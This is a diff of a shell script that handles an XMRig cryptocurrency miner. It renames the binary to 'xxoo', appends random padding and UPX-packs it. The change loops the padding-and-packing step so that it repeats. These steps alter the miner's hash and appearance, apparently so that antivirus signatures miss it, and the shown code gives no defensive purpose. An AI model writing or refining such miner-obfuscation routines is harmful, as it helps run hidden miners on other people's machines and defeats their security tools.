@@ -10,17 +10,20 @@ mv xmrig-personal-shoguncao-6.22.2/xmrig xxoo
 rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
 rm -rf xmrig-personal-shoguncao-6.22.2
 
-start_time=$(date +%s)
-dd if=/dev/urandom of=padding.bin bs=1 count=512
-cat xxoo padding.bin > tmp_xxoo
-chmod +x tmp_xxoo
-upx --best -o obfuscated_xxoo tmp_xxoo
-mv obfuscated_xxoo xxoo_1
-rm -rf padding.bin
-rm -rf tmp_xxoo
-current_time=$(date +%s)
-elapsed=$((current_time - start_time))
-echo "elapsed: ${elapsed} seconds"
+for i in {1..2}; do
+    echo "i: ${i}"
+    start_time=$(date +%s)
+    dd if=/dev/urandom of=padding.bin bs=1 count=512
+    cat xxoo padding.bin > tmp_xxoo
+    chmod +x tmp_xxoo
+    upx --best -o obfuscated_xxoo tmp_xxoo
+    mv obfuscated_xxoo xxoo_1
+    rm -rf padding.bin
+    rm -rf tmp_xxoo
+    current_time=$(date +%s)
+    elapsed=$((current_time - start_time))
+    echo "i: ${i}, elapsed: ${elapsed} seconds"
+done
 
 rm -rf xxoo
 
